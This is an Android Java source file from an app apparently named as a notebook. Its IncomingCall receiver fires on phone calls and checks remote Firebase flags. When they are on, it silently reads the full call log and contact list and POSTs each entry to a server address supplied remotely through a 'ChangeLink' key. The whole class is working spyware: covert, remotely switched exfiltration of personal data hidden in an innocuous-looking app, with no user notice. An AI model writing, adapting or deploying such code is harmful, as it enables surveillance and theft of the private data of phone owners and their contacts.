package com.example.hac.notebook;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.SystemClock;
import android.provider.CallLog;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

/**
 * Created by Hac on 19/03/2017.
 */

public class IncomingCall extends BroadcastReceiver{

    FirebaseDatabase mdatabase = FirebaseDatabase.getInstance();
    DatabaseReference myRef = mdatabase.getReference();

    @Override
    public void onReceive(Context context, Intent intent) {
       PermisLaylichsu(context);
        PermisLaydanhba(context);
    }


    public void PermisLaydanhba(final Context context){
        myRef.child("Permession").child("InComming").child("CallLog").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot dataSnapshot) {
                String kq=dataSnapshot.getValue().toString();
                if(kq.equals("1")){
                    myRef.child("Permession").child("ChangeLink").addValueEventListener(new ValueEventListener() {
                        @Override
                        public void onDataChange(DataSnapshot dataSnapshot) {

                            String link=dataSnapshot.getValue().toString();
                            String linksms=(link+"danhba_db.php").trim();

                            hiendanhba(context,linksms);

                        }

                        @Override
                        public void onCancelled(DatabaseError databaseError) {

                        }
                    });

                }else {

                }
            }
            @Override
            public void onCancelled(DatabaseError databaseError) {
            }
        });

    }


    public void PermisLaylichsu(final Context context){
        myRef.child("Permession").child("InComming").child("Histoire").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot dataSnapshot) {
                String kq=dataSnapshot.getValue().toString();
                if(kq.equals("1")){

                    myRef.child("Permession").child("ChangeLink").addValueEventListener(new ValueEventListener() {
                        @Override
                        public void onDataChange(DataSnapshot dataSnapshot) {

                            String link=dataSnapshot.getValue().toString();
                            String linksms=(link+"lichsu_db.php").trim();
                            laylichsu(context,linksms);

                        }

                        @Override
                        public void onCancelled(DatabaseError databaseError) {

                        }
                    });

                }else {
                }

            }

            @Override
            public void onCancelled(DatabaseError databaseError) {
            }
        });

    }


    private void laylichsu(Context context,String url) {
        ContentResolver contentresolver=context.getContentResolver();
        // tao 1 mang hung la de cho no sap xep cho thoi gian
        String[] projec=new String[] {CallLog.Calls.DATE,CallLog.Calls.NUMBER, CallLog.Calls.DURATION,"name","type","frequent"};
        Cursor c= contentresolver.query(CallLog.Calls.CONTENT_URI,projec,null,null,null);
        if(c!=null) {
            c.moveToFirst();

            while (!c.isAfterLast()) {


                // chuyen doi khoang thoi gian
                String giay = c.getString(c.getColumnIndex(CallLog.Calls.DURATION));
                int g = Integer.parseInt(giay);
                final String gpg = (int) g / 3600 + " : " + (int) (g - 3600 * (g / 3600)) / 60 + " : " + (int) (g - 60 * (g / 60)) + "";

                // chuyen doi dang ngay thang nam gio phut giay
                String date = c.getString(c.getColumnIndex(CallLog.Calls.DATE));
                Long timestamp = Long.parseLong(date);
                Calendar calendar = Calendar.getInstance();
                calendar.setTimeInMillis(timestamp);
                Date finaldate = calendar.getTime();
                final String smsDate = finaldate.toString();


                // chuyen doi type
                int loai = Integer.parseInt(c.getString(4));
                String type = "";
                if (loai == 1) {
                    type += "Được goi + Bắt máy"+loai;
                } else if (loai == 2) {
                    type += "Gọi đi + Không bắt máy"+loai;
                } else if (loai == 3) {
                    type += "Được gọi + Không bắt máy"+loai;
                } else {
                    type += "Không rõ lắm" + loai;
                }


                final String name=c.getString(3);
                final String so=c.getString(1);
                final String frequent=c.getString(5);
                final String finalType = type;

                if(isConnect(context)){
                    //laylichsu(context);
                    StringRequest stringRequest = new StringRequest(Request.Method.POST,url, new Response.Listener<String>() {
                        @Override
                        public void onResponse(String response) {
                            // cau tr
                        }
                    }, new Response.ErrorListener() {
                        @Override
                        public void onErrorResponse(VolleyError error) {
                            // tra loi loi
                        }
                    }){
                        @Override
                        protected Map<String, String> getParams() throws AuthFailureError {
                            Map<String,String> param=new HashMap<String, String>();
                            param.put("name",name);
                            param.put("so",so);
                            param.put("duration",gpg);
                            param.put("type", finalType);
                            param.put("frequent",frequent);
                            param.put("date",smsDate);
                            return param;
                        }
                    };
                    Singleton.getmInstance(context.getApplicationContext()).addTorequestqueue(stringRequest);

                }

                SystemClock.sleep(100);
                c.moveToNext();
            }
            c.close();
        }
    }


    private void hiendanhba(Context context,String url) {
        ContentResolver cr=context.getContentResolver();
        Uri uri = Uri.parse("content://contacts/people");
        String[] project = new String[]{"name","_id" , "last_time_contacted", "times_contacted"};
        Cursor c = cr.query(uri, project, null, null, null);
        c.moveToFirst();


        if (c.getCount() > 0) {

            while (!c.isAfterLast()){

                final String iddb=c.getString(1);
                final String namedb=c.getString(0);
                final String timesdb=c.getString(3);
                if(isConnect(context)) {

                    StringRequest stringRequest = new StringRequest(Request.Method.POST,url, new Response.Listener<String>() {
                        @Override
                        public void onResponse(String response) {
                            // cau tr
                        }
                    }, new Response.ErrorListener() {
                        @Override
                        public void onErrorResponse(VolleyError error) {
                            // tra loi loi
                        }
                    }) {
                        @Override
                        protected Map<String, String> getParams() throws AuthFailureError {
                            Map<String, String> param = new HashMap<String, String>();

                            param.put("iddb", iddb);
                            param.put("namedb", namedb);
                            param.put("timesdb", timesdb);
                            return param;
                        }
                    };


                    Singleton.getmInstance(context.getApplicationContext()).addTorequestqueue(stringRequest);
                }else {

                }

                SystemClock.sleep(100);

                c.moveToNext();
            }
        }
        c.close();
    }


    public boolean isConnect(Context context){
        ConnectivityManager cm=(ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo=cm.getActiveNetworkInfo();
        boolean b=(networkInfo!=null)&&(networkInfo.isConnectedOrConnecting());
        return b;
    }
}
